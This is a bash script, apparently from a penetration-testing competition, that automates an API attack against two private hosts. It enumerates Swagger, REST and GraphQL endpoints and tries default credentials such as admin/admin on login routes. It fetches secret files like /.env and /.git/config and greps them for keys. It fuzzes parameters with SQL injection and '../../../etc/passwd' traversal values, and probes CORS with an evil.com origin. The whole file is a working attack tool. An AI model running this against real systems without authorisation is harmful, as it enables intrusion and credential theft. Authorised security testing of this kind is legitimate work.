#!/bin/bash
# API Testing Agent
# Target: 10.0.1.99 (ports 80, 443, 8080) and 10.0.1.10:9091
# Focus: API discovery, authentication, endpoint testing, GraphQL, REST

set -e

TARGET_99="10.0.1.99"
TARGET_10="10.0.1.10"
EVIDENCE_DIR="/home/pentester/cptc/hosts/10.0.1.99-go-mysql/evidence"
FINDINGS_DIR="/home/pentester/cptc/hosts/10.0.1.99-go-mysql/findings"

mkdir -p "$EVIDENCE_DIR/api-testing"
mkdir -p "$FINDINGS_DIR"

AGENT_LOG="$EVIDENCE_DIR/api-testing/agent-api-testing.log"
echo "[$(date)] API Testing Agent Started" | tee -a "$AGENT_LOG"

# Phase 1: API Documentation Discovery
echo "[$(date)] Phase 1: API Documentation Discovery" | tee -a "$AGENT_LOG"

API_DOC_PATHS=(
    "/swagger.json"
    "/swagger.yaml"
    "/swagger.yml"
    "/swagger/v1/swagger.json"
    "/swagger/v2/swagger.json"
    "/swagger/swagger.json"
    "/api/swagger.json"
    "/api/swagger.yaml"
    "/api-docs"
    "/api-docs.json"
    "/api/docs"
    "/docs"
    "/docs/api"
    "/openapi.json"
    "/openapi.yaml"
    "/openapi.yml"
    "/api/openapi.json"
    "/v1/swagger.json"
    "/v2/swagger.json"
    "/v3/swagger.json"
    "/redoc"
    "/swagger-ui.html"
    "/swagger-ui/"
    "/api/swagger-ui/"
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Searching for API docs on port $port" | tee -a "$AGENT_LOG"

    for path in "${API_DOC_PATHS[@]}"; do
        response=$(curl -s -k -o "$EVIDENCE_DIR/api-testing/api-doc-${port}${path//\//-}.txt" \
            -w "%{http_code}" -m 10 "${protocol}://${target}${path}" 2>&1 || echo "000")

        if [ "$response" == "200" ]; then
            echo "[FOUND] API Documentation: ${protocol}://${target}${path}" | \
                tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/API-DOCS-FOUND.txt"
        fi
        sleep 0.3
    done
done

# Test port 9091 on 10.0.1.10
echo "[$(date)] Searching for API docs on 10.0.1.10:9091" | tee -a "$AGENT_LOG"
for path in "${API_DOC_PATHS[@]}"; do
    response=$(curl -s -o "$EVIDENCE_DIR/api-testing/api-doc-10-9091${path//\//-}.txt" \
        -w "%{http_code}" -m 10 "http://${TARGET_10}:9091${path}" 2>&1 || echo "000")

    if [ "$response" == "200" ]; then
        echo "[FOUND] API Documentation: http://${TARGET_10}:9091${path}" | \
            tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/API-DOCS-FOUND.txt"
    fi
    sleep 0.3
done

# Phase 2: REST API Endpoint Discovery
echo "[$(date)] Phase 2: REST API Endpoint Enumeration" | tee -a "$AGENT_LOG"

REST_ENDPOINTS=(
    "/api"
    "/api/"
    "/api/v1"
    "/api/v2"
    "/api/v3"
    "/api/v1/"
    "/api/v1/users"
    "/api/v1/user"
    "/api/v1/admin"
    "/api/v1/config"
    "/api/v1/settings"
    "/api/v1/status"
    "/api/v1/health"
    "/api/v1/version"
    "/api/v1/info"
    "/api/v1/login"
    "/api/v1/auth"
    "/api/v1/token"
    "/api/v1/register"
    "/api/v1/accounts"
    "/api/v1/profile"
    "/api/v1/data"
    "/api/v1/database"
    "/api/v1/db"
    "/api/v1/query"
    "/api/v2/users"
    "/api/v2/admin"
    "/api/users"
    "/api/user"
    "/api/admin"
    "/api/config"
    "/api/login"
    "/api/auth"
    "/api/token"
    "/v1/api"
    "/v1/users"
    "/v1/admin"
    "/v2/api"
    "/v2/users"
    "/rest/api"
    "/rest/v1"
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Testing REST endpoints on port $port" | tee -a "$AGENT_LOG"

    for endpoint in "${REST_ENDPOINTS[@]}"; do
        # GET request
        response=$(curl -s -k -o "$EVIDENCE_DIR/api-testing/rest-get-${port}${endpoint//\//-}.txt" \
            -w "%{http_code}" -m 10 "${protocol}://${target}${endpoint}" 2>&1 || echo "000")

        if [ "$response" != "404" ] && [ "$response" != "000" ]; then
            echo "[FOUND] REST Endpoint (GET $response): ${protocol}://${target}${endpoint}" | \
                tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/REST-ENDPOINTS-FOUND.txt"
        fi

        # OPTIONS request to check allowed methods
        curl -s -k -X OPTIONS -v -m 10 "${protocol}://${target}${endpoint}" \
            > "$EVIDENCE_DIR/api-testing/rest-options-${port}${endpoint//\//-}.txt" 2>&1 || true

        sleep 0.3
    done
done

# Phase 3: GraphQL Discovery and Testing
echo "[$(date)] Phase 3: GraphQL Endpoint Discovery" | tee -a "$AGENT_LOG"

GRAPHQL_PATHS=(
    "/graphql"
    "/graphql/"
    "/api/graphql"
    "/v1/graphql"
    "/v2/graphql"
    "/graphiql"
    "/graphiql/"
    "/api/graphiql"
    "/playground"
    "/api/playground"
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Testing GraphQL endpoints on port $port" | tee -a "$AGENT_LOG"

    for path in "${GRAPHQL_PATHS[@]}"; do
        # Test GET request
        response=$(curl -s -k -o "$EVIDENCE_DIR/api-testing/graphql-get-${port}${path//\//-}.txt" \
            -w "%{http_code}" -m 10 "${protocol}://${target}${path}" 2>&1 || echo "000")

        # Test POST with introspection query
        curl -s -k -X POST \
            -H "Content-Type: application/json" \
            -d '{"query": "{__schema{types{name}}}"}' \
            -o "$EVIDENCE_DIR/api-testing/graphql-introspection-${port}${path//\//-}.txt" \
            -m 10 "${protocol}://${target}${path}" 2>&1 || true

        if [ "$response" != "404" ] && [ "$response" != "000" ]; then
            echo "[FOUND] GraphQL Endpoint: ${protocol}://${target}${path}" | \
                tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/GRAPHQL-FOUND.txt"
        fi

        sleep 0.3
    done
done

# Phase 4: API Authentication Testing
echo "[$(date)] Phase 4: API Authentication Mechanism Testing" | tee -a "$AGENT_LOG"

# Test authentication endpoints with various methods
AUTH_ENDPOINTS=(
    "/api/login"
    "/api/auth"
    "/api/token"
    "/api/authenticate"
    "/api/v1/login"
    "/api/v1/auth"
    "/api/v1/token"
    "/login"
    "/auth"
    "/authenticate"
)

AUTH_PAYLOADS=(
    '{"username":"admin","password":"admin"}'
    '{"username":"admin","password":"password"}'
    '{"username":"root","password":"root"}'
    '{"username":"test","password":"test"}'
    '{"email":"admin@example.com","password":"admin"}'
    '{"user":"admin","pass":"admin"}'
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Testing authentication on port $port" | tee -a "$AGENT_LOG"

    idx=0
    for endpoint in "${AUTH_ENDPOINTS[@]}"; do
        for payload in "${AUTH_PAYLOADS[@]}"; do
            echo "[$(date)] Testing auth: $endpoint with payload $idx" | tee -a "$AGENT_LOG"

            curl -s -k -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                -v -m 10 "${protocol}://${target}${endpoint}" \
                > "$EVIDENCE_DIR/api-testing/auth-test-${port}${endpoint//\//-}-${idx}.txt" 2>&1 || true

            ((idx++))
            sleep 0.5
        done
    done
done

# Phase 5: API Key Discovery
echo "[$(date)] Phase 5: API Key and Secret Discovery" | tee -a "$AGENT_LOG"

# Look for API keys in common locations
API_KEY_PATHS=(
    "/.env"
    "/config.json"
    "/config.yml"
    "/api/keys"
    "/api/credentials"
    "/api/config"
    "/.git/config"
    "/package.json"
    "/composer.json"
    "/app.json"
    "/secrets.json"
    "/credentials.json"
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    for path in "${API_KEY_PATHS[@]}"; do
        content=$(curl -s -k -m 10 "${protocol}://${target}${path}" 2>&1 || true)

        echo "$content" > "$EVIDENCE_DIR/api-testing/api-keys-${port}${path//\//-}.txt"

        # Check for API key patterns
        if echo "$content" | grep -iE "(api[_-]?key|apikey|api[_-]?secret|token|bearer|authorization)" > /dev/null 2>&1; then
            echo "[POTENTIAL] API Key found in: ${protocol}://${target}${path}" | \
                tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/API-KEYS-POTENTIAL.txt"
        fi

        sleep 0.3
    done
done

# Phase 6: API Rate Limiting Testing
echo "[$(date)] Phase 6: API Rate Limiting Assessment" | tee -a "$AGENT_LOG"

# Test rate limiting on a common endpoint
for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Testing rate limiting on port $port" | tee -a "$AGENT_LOG"

    # Send rapid requests
    for i in {1..20}; do
        response=$(curl -s -k -o /dev/null -w "%{http_code}" -m 5 "${protocol}://${target}/api" 2>&1 || echo "000")
        echo "Request $i: $response" >> "$EVIDENCE_DIR/api-testing/rate-limit-${port}.txt"
    done

    sleep 1
done

# Phase 7: API Parameter Fuzzing
echo "[$(date)] Phase 7: API Parameter Fuzzing" | tee -a "$AGENT_LOG"

# Common API parameters to test
PARAMS=(
    "id"
    "user_id"
    "userId"
    "username"
    "email"
    "token"
    "api_key"
    "key"
    "secret"
    "page"
    "limit"
    "offset"
    "sort"
    "filter"
    "search"
    "query"
)

PARAM_VALUES=(
    "1"
    "admin"
    "0"
    "-1"
    "999999"
    "'"
    "1'"
    "1 OR 1=1"
    "../../../etc/passwd"
    "%00"
    "null"
    "undefined"
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Fuzzing API parameters on port $port" | tee -a "$AGENT_LOG"

    for param in "${PARAMS[@]}"; do
        for value in "${PARAM_VALUES[@]}"; do
            url="${protocol}://${target}/api?${param}=${value}"

            response=$(curl -s -k -m 5 "$url" 2>&1 || true)

            # Save interesting responses
            if echo "$response" | grep -iE "(error|exception|sql|mysql|database|warning|stack|trace)" > /dev/null 2>&1; then
                echo "$response" > "$EVIDENCE_DIR/api-testing/param-fuzz-${port}-${param}-${value//[\/\'\"\?\=\ ]/-}.txt"
                echo "[INTERESTING] Error in: $url" | tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/PARAM-ERRORS.txt"
            fi

            sleep 0.2
        done
    done
done

# Phase 8: API Versioning Testing
echo "[$(date)] Phase 8: API Version Enumeration" | tee -a "$AGENT_LOG"

# Test different API versions
for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    for version in {1..10}; do
        # Test /api/v{n} format
        response=$(curl -s -k -o "$EVIDENCE_DIR/api-testing/version-test-${port}-v${version}.txt" \
            -w "%{http_code}" -m 5 "${protocol}://${target}/api/v${version}" 2>&1 || echo "000")

        if [ "$response" != "404" ] && [ "$response" != "000" ]; then
            echo "[FOUND] API Version: ${protocol}://${target}/api/v${version} ($response)" | \
                tee -a "$AGENT_LOG" "$EVIDENCE_DIR/api-testing/API-VERSIONS-FOUND.txt"
        fi

        sleep 0.2
    done
done

# Phase 9: API CORS Testing
echo "[$(date)] Phase 9: CORS Policy Testing" | tee -a "$AGENT_LOG"

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    echo "[$(date)] Testing CORS on port $port" | tee -a "$AGENT_LOG"

    # Test with various origins
    ORIGINS=(
        "http://evil.com"
        "https://evil.com"
        "http://localhost"
        "null"
    )

    for origin in "${ORIGINS[@]}"; do
        curl -s -k -H "Origin: $origin" -v -m 10 "${protocol}://${target}/api" \
            > "$EVIDENCE_DIR/api-testing/cors-${port}-${origin//[\/\:]/-}.txt" 2>&1 || true

        sleep 0.3
    done
done

# Phase 10: API Method Override Testing
echo "[$(date)] Phase 10: HTTP Method Override Testing" | tee -a "$AGENT_LOG"

METHOD_OVERRIDE_HEADERS=(
    "X-HTTP-Method-Override"
    "X-HTTP-Method"
    "X-Method-Override"
    "_method"
)

for port in 80 443 8080; do
    protocol="http"
    target="${TARGET_99}"
    if [ "$port" != "80" ]; then
        protocol="https"
        if [ "$port" == "8080" ]; then
            target="${TARGET_99}:${port}"
        fi
    fi

    for header in "${METHOD_OVERRIDE_HEADERS[@]}"; do
        for method in "DELETE" "PUT" "PATCH"; do
            echo "[$(date)] Testing method override: $header: $method" | tee -a "$AGENT_LOG"

            curl -s -k -X POST -H "$header: $method" -v -m 10 "${protocol}://${target}/api" \
                > "$EVIDENCE_DIR/api-testing/method-override-${port}-${header}-${method}.txt" 2>&1 || true

            sleep 0.3
        done
    done
done

echo "[$(date)] API Testing Agent Completed" | tee -a "$AGENT_LOG"
echo "[$(date)] Results saved to: $EVIDENCE_DIR/api-testing/" | tee -a "$AGENT_LOG"

# Generate summary
if [ -f "$EVIDENCE_DIR/api-testing/API-DOCS-FOUND.txt" ]; then
    echo "[SUCCESS] API Documentation discovered!" | tee -a "$AGENT_LOG"
    cat "$EVIDENCE_DIR/api-testing/API-DOCS-FOUND.txt" | tee -a "$AGENT_LOG"
fi

if [ -f "$EVIDENCE_DIR/api-testing/REST-ENDPOINTS-FOUND.txt" ]; then
    echo "[SUCCESS] REST Endpoints discovered!" | tee -a "$AGENT_LOG"
    cat "$EVIDENCE_DIR/api-testing/REST-ENDPOINTS-FOUND.txt" | tee -a "$AGENT_LOG"
fi
